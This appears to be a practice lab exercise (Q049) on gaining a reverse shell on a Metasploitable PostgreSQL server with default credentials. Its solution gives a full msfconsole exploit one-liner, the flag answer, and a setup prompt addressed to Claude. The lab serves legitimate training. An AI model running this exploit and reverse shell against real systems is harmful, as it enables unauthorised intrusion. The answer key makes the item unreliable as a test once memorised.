# Q049 — PostgreSQL Auth RCE

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use `exploit/linux/postgres/postgres_payload` against Metasploitable postgres:postgres. Report payload type used.

---

## 🎯 Flag Format

```
payload=<type>
```

Example: `payload=linux/x86/shell_reverse_tcp`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Default payload works.
</details>

<details>
<summary>Hint 2</summary>

Verify via `getuid` (postgres user).
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/linux/postgres/postgres_payload; set RHOSTS 192.168.52.129; set USERNAME postgres; set PASSWORD postgres; set LHOST 192.168.52.128; run'
```

Yields postgres-user shell.

**Answer:** `payload=linux/x86/shell_reverse_tcp`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q049:
1. Verify Metasploitable2 (192.168.52.129) up; postgres running (sudo service postgresql status).
2. Creds postgres/postgres accepted remotely: psql -h 192.168.52.129 -U postgres (password postgres).
3. From Parrot: nmap -p 5432 192.168.52.129 — open.
4. msfconsole ready; LHOST 192.168.52.128 listener free.

Report back: "Lab ready for Q049 — Postgres 5432 open with postgres/postgres on 192.168.52.129".
```
